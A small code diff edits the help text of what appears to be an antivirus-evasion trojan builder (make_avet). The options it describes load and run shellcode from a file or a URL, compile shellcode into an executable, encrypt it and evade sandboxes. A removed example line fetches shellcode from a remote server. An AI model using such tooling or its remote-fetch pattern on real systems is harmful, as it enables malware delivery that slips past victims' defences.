@@ -204,17 +204,16 @@ int main (int argc, char **argv)
 void print_help()
 {
 	printf("Options:\n");
-	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt");
-	printf("-f compile shellcode into avet.exe, needs filename\n");
+	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
+	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
-	printf("-E use avets ASCII encryption, often do not has to be used\n")
+	printf("-E use avets ASCII encryption, often do not has to be used\n");
+	printf("   Note: with -l -E is mandatory\n");
 	printf("-F use fopen sandbox evasion\n");
 	printf("-X compile for 64 bit\n");
 	printf("-p print debug information\n");
 	printf("-h help\n\n");
-	printf("Example usage:\n");
-	printf("$ make_avet -u http://myserver.com/sh.txt -p\n");
-	printf("$ make_avet -f shellcode.txt\n");
+	printf("Please refer README.md for more information\n");
 }
 
 void print_start()
